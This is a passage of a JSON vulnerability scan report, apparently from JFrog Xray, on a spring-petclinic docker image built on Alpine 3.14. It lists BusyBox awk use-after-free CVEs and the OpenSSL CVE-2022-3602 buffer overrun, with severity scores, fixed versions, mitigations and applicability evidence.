                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42385",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190219",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42385",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190219",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42385",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42385",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190218",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42386",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190218",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `nvalloc` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42386",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42386",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190218",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42386",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190218",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `nvalloc` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42386",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42386",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-607989",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed the malicious certificate or for the application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address to overflow four attacker-controlled bytes on the stack. This buffer overflow could result in a crash (causing a denial of service) or potentially remote code execution. Many platforms implement stack overflow protections which would mitigate against the risk of remote code execution. The risk may be further mitigated based on stack layout for any given platform/compiler. Pre-announcements of CVE-2022-3602 described this issue as CRITICAL. Further analysis based on some of the mitigating factors described above have led this to be downgraded to HIGH. Users are still encouraged to upgrade to a new version as soon as possible. In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects. Fixed in OpenSSL 3.0.7 (Affected 3.0.0,3.0.1,3.0.2,3.0.3,3.0.4,3.0.5,3.0.6).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.7-r0"
            ],
            "fixed_versions": [
               "3.0.7-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3602",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed the malicious certificate or for the application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address to overflow four attacker-controlled bytes on the stack. This buffer overflow could result in a crash (causing a denial of service) or potentially remote code execution. Many platforms implement stack overflow protections which would mitigate against the risk of remote code execution. The risk may be further mitigated based on stack layout for any given platform/compiler. Pre-announcements of CVE-2022-3602 described this issue as CRITICAL. Further analysis based on some of the mitigating factors described above have led this to be downgraded to HIGH. Users are still encouraged to upgrade to a new version as soon as possible. In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects. Fixed in OpenSSL 3.0.7 (Affected 3.0.0,3.0.1,3.0.2,3.0.3,3.0.4,3.0.5,3.0.6).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-3602",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Symbol",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002c9e0",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002cee0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000118c8",
                        "X509_verify_cert",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000119b8",
                        "SSL_CTX_set_verify_depth",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011c70",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011e28",
                        "X509_verify_cert_error_string",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011f80",
                        "SSL_accept",
                        "The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011fa0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates, The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates",
            "details": [
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002c9e0, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002cee0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000118c8, Symbol: X509_verify_cert, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000119b8, Symbol: SSL_CTX_set_verify_depth, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011c70, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011e28, Symbol: X509_verify_cert_error_string, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011f80, Symbol: SSL_accept, Issue Found: The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011fa0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-3602",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-607989",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed the malicious certificate or for the application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address to overflow four attacker-controlled bytes on the stack. This buffer overflow could result in a crash (causing a denial of service) or potentially remote code execution. Many platforms implement stack overflow protections which would mitigate against the risk of remote code execution. The risk may be further mitigated based on stack layout for any given platform/compiler. Pre-announcements of CVE-2022-3602 described this issue as CRITICAL. Further analysis based on some of the mitigating factors described above have led this to be downgraded to HIGH. Users are still encouraged to upgrade to a new version as soon as possible. In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects. Fixed in OpenSSL 3.0.7 (Affected 3.0.0,3.0.1,3.0.2,3.0.3,3.0.4,3.0.5,3.0.6).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.7-r0"
            ],
            "fixed_versions": [
               "3.0.7-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3602",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
